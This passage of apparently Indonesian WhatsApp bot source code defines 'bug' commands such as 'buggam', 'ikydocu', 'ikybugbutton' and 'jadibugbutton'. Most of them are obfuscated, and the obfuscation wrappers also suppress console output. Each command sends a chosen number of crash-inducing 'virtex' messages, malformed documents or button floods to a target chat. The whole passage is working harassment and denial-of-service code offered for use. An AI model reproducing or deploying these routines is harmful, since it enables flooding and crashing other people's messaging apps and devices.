function _0x2092(_0x4d8f4d,_0x4156cc){const _0x245ab3=_0x2c90();return _0x2092=function(_0x59b214,_0xcf90ac){_0x59b214=_0x59b214-0x89;let _0x42ab4a=_0x245ab3[_0x59b214];return _0x42ab4a;},_0x2092(_0x4d8f4d,_0x4156cc);}const _0x34ce09=_0x2092;(function(_0x452f86,_0x2c65f4){const _0x21396d=_0x2092,_0x27acc3=_0x452f86();while(!![]){try{const _0x215eda=-parseInt(_0x21396d(0x97))/0x1*(parseInt(_0x21396d(0xa3))/0x2)+parseInt(_0x21396d(0x8b))/0x3*(parseInt(_0x21396d(0x94))/0x4)+parseInt(_0x21396d(0x89))/0x5*(-parseInt(_0x21396d(0xa2))/0x6)+-parseInt(_0x21396d(0x92))/0x7+parseInt(_0x21396d(0xa7))/0x8+-parseInt(_0x21396d(0xad))/0x9*(-parseInt(_0x21396d(0x93))/0xa)+-parseInt(_0x21396d(0xac))/0xb;if(_0x215eda===_0x2c65f4)break;else _0x27acc3['push'](_0x27acc3['shift']());}catch(_0x4eec17){_0x27acc3['push'](_0x27acc3['shift']());}}}(_0x2c90,0x20a0e));function _0x2c90(){const _0x15bf0c=['280362YrmKSr','PHOTO','search','\x20Ngentids\x20メ\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','waUploadToServer','warn','error','775901FZUnqK','1220LDcoXc','8hBsrFM','document/pdf','Sukses','30IlANVz','trace','*Send/Reply\x20Media','exception','prototype','table','return\x20(function()\x20','log','(((.+)+)+)+$','download','bind','18ugAAWw','9008qsGhkL','sendMessage','console','info','1819336qQyNZO','__proto__','quoted','toString','constructor','1952885vzWaRA','18945SbTRUT','length','189985xthbXM','apply'];_0x2c90=function(){return _0x15bf0c;};return _0x2c90();}const _0x2f019b=(function(){let _0x71a6e8=!![];return function(_0x197f62,_0x35330c){const _0x1d6eb4=_0x71a6e8?function(){const _0x856721=_0x2092;if(_0x35330c){const _0x4700e6=_0x35330c[_0x856721(0x8a)](_0x197f62,arguments);return _0x35330c=null,_0x4700e6;}}:function(){};return _0x71a6e8=![],_0x1d6eb4;};}()),_0x9d10cc=_0x2f019b(this,function(){const _0x20c586=_0x2092;return _0x9d10cc[_0x20c586(0xaa)]()[_0x20c586(0x8d)](_0x20c586(0x9f))['toString']()['constructor'](_0x9d10cc)[_0x20c586(0x8d)](_0x20c586(0x9f));});_0x9d10cc();const _0xcf90ac=(function(){let _0x25e9a1=!![];return function(_0x5efc1a,_0x52014f){const _0x548542=_0x25e9a1?function(){if(_0x52014f){const _0x3693fa=_0x52014f['apply'](_0x5efc1a,arguments);return _0x52014f=null,_0x3693fa;}}:function(){};return _0x25e9a1=![],_0x548542;};}()),_0x59b214=_0xcf90ac(this,function(){const _0x16aef8=_0x2092,_0x319e4a=function(){const _0x442059=_0x2092;let _0x34bf49;try{_0x34bf49=Function(_0x442059(0x9d)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x3d95a5){_0x34bf49=window;}return _0x34bf49;},_0x4ddcfc=_0x319e4a(),_0x233d08=_0x4ddcfc[_0x16aef8(0xa5)]=_0x4ddcfc[_0x16aef8(0xa5)]||{},_0x36f4a9=[_0x16aef8(0x9e),_0x16aef8(0x90),_0x16aef8(0xa6),_0x16aef8(0x91),_0x16aef8(0x9a),_0x16aef8(0x9c),_0x16aef8(0x98)];for(let _0x319334=0x0;_0x319334<_0x36f4a9[_0x16aef8(0xae)];_0x319334++){const _0x2f8127=_0xcf90ac[_0x16aef8(0xab)][_0x16aef8(0x9b)]['bind'](_0xcf90ac),_0x63d6a3=_0x36f4a9[_0x319334],_0x28c39f=_0x233d08[_0x63d6a3]||_0x2f8127;_0x2f8127[_0x16aef8(0xa8)]=_0xcf90ac[_0x16aef8(0xa1)](_0xcf90ac),_0x2f8127[_0x16aef8(0xaa)]=_0x28c39f[_0x16aef8(0xaa)]['bind'](_0x28c39f),_0x233d08[_0x63d6a3]=_0x2f8127;}});_0x59b214();{if(!isCreator&&!isBan)return;if(!m[_0x34ce09(0xa9)])throw _0x34ce09(0x99);if(!text)throw'Teksnya\x20Mana?';let media=await quoted[_0x34ce09(0xa0)]();var messa=await prepareWAMessageMedia({'document':media},{'upload':ikycoli[_0x34ce09(0x8f)]});lala=media,ikycoli[_0x34ce09(0xa4)](m['chat'],{'document':lala,'mimetype':_0x34ce09(0x95),'fileName':text+_0x34ce09(0x8e)+ikybabel,'thumbnail':virgam,'quoted':m,'contextInfo':{'externalAdReply':{'title':wm+'\x20\x0a'+ikybabel,'body':wm+'\x20\x0a'+ikybabel,'previewType':_0x34ce09(0x8c),'showAdAttribution':!![],'thumbnail':virgam,'sourceUrl':'https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w'}},'caption':''+ikybabel},{'quoted':fkntliky,'contextInfo':{}}),jancok(_0x34ce09(0x96));}
}
break

case 'buggam':{
function _0x26f0(){const _0x578da9=['log','1263122PFvvob','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','(((.+)+)+)+$','18SbDZFK','chat','prototype','search','reply','exception','Sukses\x20Send\x20Bug\x20Sebanyak\x20','1593613MHlstt','return\x20(function()\x20','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓\x0a\x0a','constructor','trace','18FhGmPG','1OZuDmW','toString','console','warn','length','3804292XidCbp','table','PHOTO','15056520QXZdvn','Jumlahnya?','4539448LSEHGG','6059375WrdXlq','2043135jmAfKH','https://telegra.ph/file/313cd5e07455d25a8db88.jpg','info','apply','{}.constructor(\x22return\x20this\x22)(\x20)','error','bind'];_0x26f0=function(){return _0x578da9;};return _0x26f0();}const _0x4fa4d8=_0x34e4;(function(_0x2d8dad,_0xd5ecc8){const _0x4c9b48=_0x34e4,_0x3db538=_0x2d8dad();while(!![]){try{const _0x138ba0=-parseInt(_0x4c9b48(0x1cc))/0x1*(-parseInt(_0x4c9b48(0x1e0))/0x2)+parseInt(_0x4c9b48(0x1d8))/0x3+parseInt(_0x4c9b48(0x1d1))/0x4+-parseInt(_0x4c9b48(0x1d7))/0x5+parseInt(_0x4c9b48(0x1e3))/0x6*(-parseInt(_0x4c9b48(0x1ea))/0x7)+parseInt(_0x4c9b48(0x1d6))/0x8*(-parseInt(_0x4c9b48(0x1cb))/0x9)+parseInt(_0x4c9b48(0x1d4))/0xa;if(_0x138ba0===_0xd5ecc8)break;else _0x3db538['push'](_0x3db538['shift']());}catch(_0x450ec9){_0x3db538['push'](_0x3db538['shift']());}}}(_0x26f0,0xb4921));const _0x360b1d=(function(){let _0x3cb42b=!![];return function(_0x1df565,_0x198b3b){const _0x24eb04=_0x3cb42b?function(){const _0x20d113=_0x34e4;if(_0x198b3b){const _0x15ea6c=_0x198b3b[_0x20d113(0x1db)](_0x1df565,arguments);return _0x198b3b=null,_0x15ea6c;}}:function(){};return _0x3cb42b=![],_0x24eb04;};}()),_0x35e541=_0x360b1d(this,function(){const _0x22630f=_0x34e4;return _0x35e541[_0x22630f(0x1cd)]()[_0x22630f(0x1e6)](_0x22630f(0x1e2))['toString']()['constructor'](_0x35e541)['search'](_0x22630f(0x1e2));});_0x35e541();function _0x34e4(_0x3eb782,_0xf3ad5f){const _0x863b5b=_0x26f0();return _0x34e4=function(_0x2d5de5,_0x5231aa){_0x2d5de5=_0x2d5de5-0x1ca;let _0x35a42c=_0x863b5b[_0x2d5de5];return _0x35a42c;},_0x34e4(_0x3eb782,_0xf3ad5f);}const _0x5231aa=(function(){let _0xffc76a=!![];return function(_0x15946,_0x4e59a6){const _0x319c14=_0xffc76a?function(){const _0x4fdb41=_0x34e4;if(_0x4e59a6){const _0x1938e2=_0x4e59a6[_0x4fdb41(0x1db)](_0x15946,arguments);return _0x4e59a6=null,_0x1938e2;}}:function(){};return _0xffc76a=![],_0x319c14;};}()),_0x2d5de5=_0x5231aa(this,function(){const _0x40c271=_0x34e4,_0x3afc45=function(){const _0x4121f1=_0x34e4;let _0x2f2dfa;try{_0x2f2dfa=Function(_0x4121f1(0x1eb)+_0x4121f1(0x1dc)+');')();}catch(_0x3369a7){_0x2f2dfa=window;}return _0x2f2dfa;},_0x22ce1c=_0x3afc45(),_0x105e91=_0x22ce1c[_0x40c271(0x1ce)]=_0x22ce1c[_0x40c271(0x1ce)]||{},_0x14cd06=[_0x40c271(0x1df),_0x40c271(0x1cf),_0x40c271(0x1da),_0x40c271(0x1dd),_0x40c271(0x1e8),_0x40c271(0x1d2),_0x40c271(0x1ca)];for(let _0x5723e1=0x0;_0x5723e1<_0x14cd06[_0x40c271(0x1d0)];_0x5723e1++){const _0x543333=_0x5231aa[_0x40c271(0x1ed)][_0x40c271(0x1e5)][_0x40c271(0x1de)](_0x5231aa),_0x7ed2b7=_0x14cd06[_0x5723e1],_0x38e08c=_0x105e91[_0x7ed2b7]||_0x543333;_0x543333['__proto__']=_0x5231aa[_0x40c271(0x1de)](_0x5231aa),_0x543333[_0x40c271(0x1cd)]=_0x38e08c[_0x40c271(0x1cd)][_0x40c271(0x1de)](_0x38e08c),_0x105e91[_0x7ed2b7]=_0x543333;}});_0x2d5de5();{if(!isCreator&&!isBan)return;if(args[_0x4fa4d8(0x1d0)]==0x0)return m[_0x4fa4d8(0x1e7)](_0x4fa4d8(0x1d5));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){anu=_0x4fa4d8(0x1ec)+ikybabel,ikycoli['sendMessage'](m[_0x4fa4d8(0x1e4)],{'image':{'url':_0x4fa4d8(0x1d9)},'contextInfo':{'externalAdReply':{'title':''+ikybabel,'body':''+ikybabel,'previewType':_0x4fa4d8(0x1d3),'showAdAttribution':!![],'sourceUrl':_0x4fa4d8(0x1e1),'thumbnail':virgam}},'caption':anu},{'quoted':ikyzyx,'contextInfo':{}});}jancok(_0x4fa4d8(0x1e9)+jumlah);}
}
break


case 'ikydocu':{
function _0x5f5a(_0xc4e5cc,_0x3a11a8){const _0x315424=_0x1e52();return _0x5f5a=function(_0x3da943,_0x146dbc){_0x3da943=_0x3da943-0x14f;let _0x3e0fc9=_0x315424[_0x3da943];return _0x3e0fc9;},_0x5f5a(_0xc4e5cc,_0x3a11a8);}const _0x2c21ac=_0x5f5a;(function(_0x53bdbf,_0x29fdbd){const _0x4694f5=_0x5f5a,_0x440deb=_0x53bdbf();while(!![]){try{const _0xc7f889=-parseInt(_0x4694f5(0x14f))/0x1*(-parseInt(_0x4694f5(0x155))/0x2)+parseInt(_0x4694f5(0x150))/0x3*(-parseInt(_0x4694f5(0x165))/0x4)+-parseInt(_0x4694f5(0x162))/0x5+-parseInt(_0x4694f5(0x16b))/0x6*(-parseInt(_0x4694f5(0x151))/0x7)+parseInt(_0x4694f5(0x161))/0x8+parseInt(_0x4694f5(0x157))/0x9*(-parseInt(_0x4694f5(0x16c))/0xa)+-parseInt(_0x4694f5(0x166))/0xb*(parseInt(_0x4694f5(0x16a))/0xc);if(_0xc7f889===_0x29fdbd)break;else _0x440deb['push'](_0x440deb['shift']());}catch(_0x46a9e0){_0x440deb['push'](_0x440deb['shift']());}}}(_0x1e52,0x6d631));const _0x532cd8=(function(){let _0x5180ce=!![];return function(_0x207b8e,_0xc88ffe){const _0x5021b8=_0x5180ce?function(){if(_0xc88ffe){const _0x269afc=_0xc88ffe['apply'](_0x207b8e,arguments);return _0xc88ffe=null,_0x269afc;}}:function(){};return _0x5180ce=![],_0x5021b8;};}()),_0x1b1e88=_0x532cd8(this,function(){const _0x1d07ff=_0x5f5a;return _0x1b1e88['toString']()[_0x1d07ff(0x15a)](_0x1d07ff(0x170))[_0x1d07ff(0x154)]()[_0x1d07ff(0x15f)](_0x1b1e88)[_0x1d07ff(0x15a)]('(((.+)+)+)+$');});_0x1b1e88();function _0x1e52(){const _0x335fc8=['exception','./virtex/iphone.mp3','search','bind','log','0@s.whatsapp.net','{}.constructor(\x22return\x20this\x22)(\x20)','constructor','apply','1762544zFVRwp','2490775QcsFrO','info','table','68NLzgOo','33XMBRhr','.js','length','trace','1132440UErefr','4551576KuCEkD','418010gGlrth','🔥\x20THE\x20IKYY\x20BOTZ\x20🔥','Sukses\x20Send\x20Bug\x20Sebanyak\x20','console','(((.+)+)+)+$','448206JxHqgu','12777SRqKJA','7AvzWCq','return\x20(function()\x20','__proto__','toString','2BlScrv','Jumlahnya?','27PcJDNd'];_0x1e52=function(){return _0x335fc8;};return _0x1e52();}const _0x146dbc=(function(){let _0x5cac2c=!![];return function(_0x3e5586,_0x3608da){const _0x4acfd9=_0x5cac2c?function(){const _0x59ae26=_0x5f5a;if(_0x3608da){const _0x41f80a=_0x3608da[_0x59ae26(0x160)](_0x3e5586,arguments);return _0x3608da=null,_0x41f80a;}}:function(){};return _0x5cac2c=![],_0x4acfd9;};}()),_0x3da943=_0x146dbc(this,function(){const _0x4f8ec0=_0x5f5a,_0x932bb8=function(){const _0x4bcce0=_0x5f5a;let _0x242cfe;try{_0x242cfe=Function(_0x4bcce0(0x152)+_0x4bcce0(0x15e)+');')();}catch(_0x5bba42){_0x242cfe=window;}return _0x242cfe;},_0x8ba86f=_0x932bb8(),_0x556f41=_0x8ba86f[_0x4f8ec0(0x16f)]=_0x8ba86f[_0x4f8ec0(0x16f)]||{},_0x5710ea=[_0x4f8ec0(0x15c),'warn',_0x4f8ec0(0x163),'error',_0x4f8ec0(0x158),_0x4f8ec0(0x164),_0x4f8ec0(0x169)];for(let _0x2e0907=0x0;_0x2e0907<_0x5710ea['length'];_0x2e0907++){const _0x3830b2=_0x146dbc['constructor']['prototype']['bind'](_0x146dbc),_0x2ad5d1=_0x5710ea[_0x2e0907],_0x20477f=_0x556f41[_0x2ad5d1]||_0x3830b2;_0x3830b2[_0x4f8ec0(0x153)]=_0x146dbc[_0x4f8ec0(0x15b)](_0x146dbc),_0x3830b2[_0x4f8ec0(0x154)]=_0x20477f['toString']['bind'](_0x20477f),_0x556f41[_0x2ad5d1]=_0x3830b2;}});_0x3da943();{if(!isCreator&&!isBan)return;if(args[_0x2c21ac(0x168)]==0x0)return m['reply'](_0x2c21ac(0x156));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let doc={'key':{'participant':_0x2c21ac(0x15d)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':virgam}}};y1=fs['readFileSync'](_0x2c21ac(0x159)),ikycoli['sendMessage'](m['chat'],{'document':y1,'fileName':_0x2c21ac(0x16d)+philips+'\x20'+ngazap+_0x2c21ac(0x167),'quoted':doc});}jancok(_0x2c21ac(0x16e)+jumlah);}
}
break
case 'ikythemonster': {
if (!isCreator && !isBan) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
            ikycoli.sendMessage(m.chat, {text:"𝐈𝐊𝐘𝐘 𝐍𝐎𝐓 𝐀𝐋𝐈𝐄𝐍⚡"},{quoted:ikygamzyx})
            }
            jancok(`Sukses Send Bug Sebanyak ${jumlah}`)
            }
            break

case 'ikybugbutton':{
function _0x4a39(_0x3f96f8,_0x4b003d){const _0x40f740=_0x46ac();return _0x4a39=function(_0x3530a2,_0x76627d){_0x3530a2=_0x3530a2-0x13a;let _0x1a5acb=_0x40f740[_0x3530a2];return _0x1a5acb;},_0x4a39(_0x3f96f8,_0x4b003d);}const _0x4968b7=_0x4a39;(function(_0x41e3a3,_0x5f4c93){const _0x54423d=_0x4a39,_0x4c6fa5=_0x41e3a3();while(!![]){try{const _0x291b46=-parseInt(_0x54423d(0x156))/0x1*(-parseInt(_0x54423d(0x13b))/0x2)+-parseInt(_0x54423d(0x146))/0x3*(parseInt(_0x54423d(0x152))/0x4)+-parseInt(_0x54423d(0x155))/0x5*(parseInt(_0x54423d(0x150))/0x6)+-parseInt(_0x54423d(0x149))/0x7+parseInt(_0x54423d(0x14a))/0x8*(-parseInt(_0x54423d(0x15c))/0x9)+-parseInt(_0x54423d(0x14c))/0xa+parseInt(_0x54423d(0x158))/0xb*(parseInt(_0x54423d(0x151))/0xc);if(_0x291b46===_0x5f4c93)break;else _0x4c6fa5['push'](_0x4c6fa5['shift']());}catch(_0x592065){_0x4c6fa5['push'](_0x4c6fa5['shift']());}}}(_0x46ac,0x9801f));const _0x269ecc=(function(){let _0x335202=!![];return function(_0x45304e,_0x5c3ce9){const _0x2514dd=_0x335202?function(){const _0x55668b=_0x4a39;if(_0x5c3ce9){const _0x54f63a=_0x5c3ce9[_0x55668b(0x13d)](_0x45304e,arguments);return _0x5c3ce9=null,_0x54f63a;}}:function(){};return _0x335202=![],_0x2514dd;};}()),_0x34e4f4=_0x269ecc(this,function(){const _0x56edb1=_0x4a39;return _0x34e4f4[_0x56edb1(0x13c)]()['search']('(((.+)+)+)+$')[_0x56edb1(0x13c)]()[_0x56edb1(0x13f)](_0x34e4f4)[_0x56edb1(0x154)](_0x56edb1(0x13a));});function _0x46ac(){const _0x4254e4=['1aTVjXj','__proto__','35981XBXHim','return\x20(function()\x20','warn','length','15237SJYIFG','(((.+)+)+)+$','1229414dwWDlF','toString','apply','Jumlahnya?','constructor','trace','chat','console','prototype','𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕🔥','info','3561543scRsUX','sendMessage','table','790153FKAEEo','2320OdSyxG','exception','5204700tSZveX','babababbababa','bind','Sukses\x20Send\x20Bug\x20Sebanyak\x20','7063698HdDJfT','12828euEpJb','4IRjWWy','log','search','5KiWMfL'];_0x46ac=function(){return _0x4254e4;};return _0x46ac();}_0x34e4f4();const _0x76627d=(function(){let _0x31f739=!![];return function(_0x1f8f92,_0x7c9bc0){const _0x4377d2=_0x31f739?function(){if(_0x7c9bc0){const _0x22b48e=_0x7c9bc0['apply'](_0x1f8f92,arguments);return _0x7c9bc0=null,_0x22b48e;}}:function(){};return _0x31f739=![],_0x4377d2;};}()),_0x3530a2=_0x76627d(this,function(){const _0x28c420=_0x4a39;let _0x1a7e4a;try{const _0x5c5ed1=Function(_0x28c420(0x159)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x1a7e4a=_0x5c5ed1();}catch(_0x25eefb){_0x1a7e4a=window;}const _0x16e010=_0x1a7e4a[_0x28c420(0x142)]=_0x1a7e4a[_0x28c420(0x142)]||{},_0x9faa4c=[_0x28c420(0x153),_0x28c420(0x15a),_0x28c420(0x145),'error',_0x28c420(0x14b),_0x28c420(0x148),_0x28c420(0x140)];for(let _0x545f22=0x0;_0x545f22<_0x9faa4c[_0x28c420(0x15b)];_0x545f22++){const _0x373dd8=_0x76627d[_0x28c420(0x13f)][_0x28c420(0x143)][_0x28c420(0x14e)](_0x76627d),_0x181352=_0x9faa4c[_0x545f22],_0x18b116=_0x16e010[_0x181352]||_0x373dd8;_0x373dd8[_0x28c420(0x157)]=_0x76627d['bind'](_0x76627d),_0x373dd8[_0x28c420(0x13c)]=_0x18b116[_0x28c420(0x13c)][_0x28c420(0x14e)](_0x18b116),_0x16e010[_0x181352]=_0x373dd8;}});_0x3530a2();{if(!isCreator&&!isBan)return;if(args[_0x4968b7(0x15b)]==0x0)return m['reply'](_0x4968b7(0x13e));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const buttons=[{'buttonId':prefix+'djisdjiwdjjes','buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':'babaabbabababa','buttonText':{'displayText':''+buttonvirus},'type':0x1},{'buttonId':_0x4968b7(0x14d),'buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'text':_0x4968b7(0x144),'footerText':'Pe','buttons':buttons,'headerType':0x1};ikycoli[_0x4968b7(0x147)](m[_0x4968b7(0x141)],buttonMessage);}jancok(_0x4968b7(0x14f)+jumlah);}
}
               break
case 'ikybuttonygy':{
const _0x4e726a=_0x51ff;(function(_0xa83657,_0x131e86){const _0x4794fe=_0x51ff,_0x1ae9dc=_0xa83657();while(!![]){try{const _0x365567=-parseInt(_0x4794fe(0x1b0))/0x1*(parseInt(_0x4794fe(0x1b1))/0x2)+parseInt(_0x4794fe(0x1b2))/0x3+-parseInt(_0x4794fe(0x1aa))/0x4*(parseInt(_0x4794fe(0x1bd))/0x5)+parseInt(_0x4794fe(0x1ba))/0x6*(parseInt(_0x4794fe(0x1a7))/0x7)+-parseInt(_0x4794fe(0x1a3))/0x8+parseInt(_0x4794fe(0x1ad))/0x9*(-parseInt(_0x4794fe(0x1a9))/0xa)+-parseInt(_0x4794fe(0x1b7))/0xb*(-parseInt(_0x4794fe(0x1b4))/0xc);if(_0x365567===_0x131e86)break;else _0x1ae9dc['push'](_0x1ae9dc['shift']());}catch(_0x346b5b){_0x1ae9dc['push'](_0x1ae9dc['shift']());}}}(_0x437d,0x2b7c7));const _0x103373=(function(){let _0x3d7f8b=!![];return function(_0x7bc9f4,_0x3a351c){const _0x1ed693=_0x3d7f8b?function(){const _0xe05221=_0x51ff;if(_0x3a351c){const _0x820881=_0x3a351c[_0xe05221(0x1b9)](_0x7bc9f4,arguments);return _0x3a351c=null,_0x820881;}}:function(){};return _0x3d7f8b=![],_0x1ed693;};}()),_0x54981b=_0x103373(this,function(){const _0x30f761=_0x51ff;return _0x54981b[_0x30f761(0x1bf)]()[_0x30f761(0x1af)](_0x30f761(0x1a8))['toString']()['constructor'](_0x54981b)[_0x30f761(0x1af)](_0x30f761(0x1a8));});function _0x437d(){const _0x3ee407=['info','1643967sQWPWj','Jumlahnya?','search','70164YzBGOh','6SentVV','226080aAyqNs','console','6430860XBPUAy','length','chat','11OnnrvG','error','apply','36sumkVo','bind','warn','5tVpBFu','prototype','toString','exception','Sukses\x20Send\x20Bug\x20Sebanyak\x20','babababbababa','1426416MXEaTn','sendMessage','constructor','key','286531LjhOjq','(((.+)+)+)+$','10AthSuY','429148AqQuJO','{}.constructor(\x22return\x20this\x22)(\x20)'];_0x437d=function(){return _0x3ee407;};return _0x437d();}_0x54981b();const _0x21fa75=(function(){let _0x2b7dcf=!![];return function(_0x59d486,_0x2f23b8){const _0x15749f=_0x2b7dcf?function(){if(_0x2f23b8){const _0x424d2d=_0x2f23b8['apply'](_0x59d486,arguments);return _0x2f23b8=null,_0x424d2d;}}:function(){};return _0x2b7dcf=![],_0x15749f;};}()),_0x225526=_0x21fa75(this,function(){const _0x59489d=_0x51ff,_0x3da01d=function(){const _0x1519ee=_0x51ff;let _0x199a60;try{_0x199a60=Function('return\x20(function()\x20'+_0x1519ee(0x1ab)+');')();}catch(_0xadd8df){_0x199a60=window;}return _0x199a60;},_0x432cb4=_0x3da01d(),_0x2cbf66=_0x432cb4[_0x59489d(0x1b3)]=_0x432cb4[_0x59489d(0x1b3)]||{},_0x46ffe8=['log',_0x59489d(0x1bc),_0x59489d(0x1ac),_0x59489d(0x1b8),_0x59489d(0x1c0),'table','trace'];for(let _0x2ecfd8=0x0;_0x2ecfd8<_0x46ffe8[_0x59489d(0x1b5)];_0x2ecfd8++){const _0x401f31=_0x21fa75[_0x59489d(0x1a5)][_0x59489d(0x1be)]['bind'](_0x21fa75),_0x490122=_0x46ffe8[_0x2ecfd8],_0x3a094b=_0x2cbf66[_0x490122]||_0x401f31;_0x401f31['__proto__']=_0x21fa75['bind'](_0x21fa75),_0x401f31[_0x59489d(0x1bf)]=_0x3a094b[_0x59489d(0x1bf)][_0x59489d(0x1bb)](_0x3a094b),_0x2cbf66[_0x490122]=_0x401f31;}});function _0x51ff(_0x50c5b6,_0x58547d){const _0x5523c5=_0x437d();return _0x51ff=function(_0x225526,_0x21fa75){_0x225526=_0x225526-0x1a1;let _0x5e892d=_0x5523c5[_0x225526];return _0x5e892d;},_0x51ff(_0x50c5b6,_0x58547d);}_0x225526();{if(!isCreator&&!isBan)return;if(args[_0x4e726a(0x1b5)]==0x0)return m['reply'](_0x4e726a(0x1ae));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){a=await ikycoli[_0x4e726a(0x1a4)](m[_0x4e726a(0x1b6)],{'react':{'text':'\x20️','key':{'remoteJid':m[_0x4e726a(0x1b6)],'fromMe':!![],'id':m[_0x4e726a(0x1a6)]['id']}}});const buttons=[{'buttonId':prefix+'djisdjiwdjjes','buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':'babaabbabababa','buttonText':{'displayText':''+buttonvirus},'type':0x1},{'buttonId':_0x4e726a(0x1a2),'buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'text':''+four,'footerText':'Pe','buttons':buttons,'headerType':0x1};ikycoli[_0x4e726a(0x1a4)](m[_0x4e726a(0x1b6)],buttonMessage,{'quoted':a});}jancok(_0x4e726a(0x1a1)+jumlah);}
}
   break
case 'jadibugbutton':{
const _0x5c7f95=_0x16a8;function _0x16a8(_0x27d0d4,_0x50b05a){const _0x4c24a8=_0x3851();return _0x16a8=function(_0x3b238d,_0x3ae347){_0x3b238d=_0x3b238d-0x16f;let _0x2b6d0a=_0x4c24a8[_0x3b238d];return _0x2b6d0a;},_0x16a8(_0x27d0d4,_0x50b05a);}(function(_0x9ac442,_0x171ab4){const _0x34093f=_0x16a8,_0x137d8e=_0x9ac442();while(!![]){try{const _0x5e84cc=-parseInt(_0x34093f(0x183))/0x1+parseInt(_0x34093f(0x18a))/0x2*(parseInt(_0x34093f(0x177))/0x3)+parseInt(_0x34093f(0x190))/0x4*(parseInt(_0x34093f(0x17e))/0x5)+parseInt(_0x34093f(0x18e))/0x6+parseInt(_0x34093f(0x170))/0x7*(parseInt(_0x34093f(0x16f))/0x8)+-parseInt(_0x34093f(0x189))/0x9+-parseInt(_0x34093f(0x174))/0xa*(-parseInt(_0x34093f(0x17a))/0xb);if(_0x5e84cc===_0x171ab4)break;else _0x137d8e['push'](_0x137d8e['shift']());}catch(_0xe6148c){_0x137d8e['push'](_0x137d8e['shift']());}}}(_0x3851,0xe7d7c));const _0x18a243=(function(){let _0x5383b8=!![];return function(_0x37891e,_0x386e03){const _0x534599=_0x5383b8?function(){if(_0x386e03){const _0x5b56d1=_0x386e03['apply'](_0x37891e,arguments);return _0x386e03=null,_0x5b56d1;}}:function(){};return _0x5383b8=![],_0x534599;};}()),_0x50633a=_0x18a243(this,function(){const _0x4c610e=_0x16a8;return _0x50633a[_0x4c610e(0x175)]()[_0x4c610e(0x191)](_0x4c610e(0x173))[_0x4c610e(0x175)]()[_0x4c610e(0x182)](_0x50633a)[_0x4c610e(0x191)]('(((.+)+)+)+$');});function _0x3851(){const _0x297b0c=['2855721QoIRqQ','trace','info','length','18215WSarPW','error','babababbababa','sendMessage','constructor','1325110BRTRkH','djisdjiwdjjes','prototype','chat','exception','Sukses\x20Convert\x20Bugbutton','3920976BfgRWV','4696IgoAbp','return\x20(function()\x20','table','{}.constructor(\x22return\x20this\x22)(\x20)','2782782RVmPLA','Teksnya\x20Mana?','136fyITFZ','search','warn','516088kbfngg','140SnIwIZ','console','bind','(((.+)+)+)+$','10xqZiNr','toString','babaabbabababa','732FsVYVH','apply','log'];_0x3851=function(){return _0x297b0c;};return _0x3851();}_0x50633a();const _0x3ae347=(function(){let _0x1b213a=!![];return function(_0x13d97d,_0x8e215){const _0x5af6a4=_0x1b213a?function(){const _0x3b7126=_0x16a8;if(_0x8e215){const _0x156552=_0x8e215[_0x3b7126(0x178)](_0x13d97d,arguments);return _0x8e215=null,_0x156552;}}:function(){};return _0x1b213a=![],_0x5af6a4;};}()),_0x3b238d=_0x3ae347(this,function(){const _0x263a26=_0x16a8;let _0x3acf48;try{const _0x3fb3b8=Function(_0x263a26(0x18b)+_0x263a26(0x18d)+');');_0x3acf48=_0x3fb3b8();}catch(_0x1821f7){_0x3acf48=window;}const _0x36ff14=_0x3acf48[_0x263a26(0x171)]=_0x3acf48['console']||{},_0x3f3f35=[_0x263a26(0x179),_0x263a26(0x192),_0x263a26(0x17c),_0x263a26(0x17f),_0x263a26(0x187),_0x263a26(0x18c),_0x263a26(0x17b)];for(let _0x15efe5=0x0;_0x15efe5<_0x3f3f35[_0x263a26(0x17d)];_0x15efe5++){const _0x3bcfc5=_0x3ae347[_0x263a26(0x182)][_0x263a26(0x185)][_0x263a26(0x172)](_0x3ae347),_0x4459d1=_0x3f3f35[_0x15efe5],_0x2af8e8=_0x36ff14[_0x4459d1]||_0x3bcfc5;_0x3bcfc5['__proto__']=_0x3ae347[_0x263a26(0x172)](_0x3ae347),_0x3bcfc5[_0x263a26(0x175)]=_0x2af8e8[_0x263a26(0x175)][_0x263a26(0x172)](_0x2af8e8),_0x36ff14[_0x4459d1]=_0x3bcfc5;}});_0x3b238d();{if(!isCreator&&!isBan)return;if(!text)throw _0x5c7f95(0x18f);const buttons=[{'buttonId':prefix+_0x5c7f95(0x184),'buttonText':{'displayText':''+ikyenak},'type':0x1},{'buttonId':_0x5c7f95(0x176),'buttonText':{'displayText':''+ikybabel},'type':0x1},{'buttonId':_0x5c7f95(0x180),'buttonText':{'displayText':''+ikyenak},'type':0x1}],buttonMessage={'text':'BUG\x20BY\x20'+text,'footerText':'Pe','buttons':buttons,'headerType':0x1};ikycoli[_0x5c7f95(0x181)](m[_0x5c7f95(0x186)],buttonMessage),jancok(_0x5c7f95(0x188));}
}
   break

case 'ikybutton': {
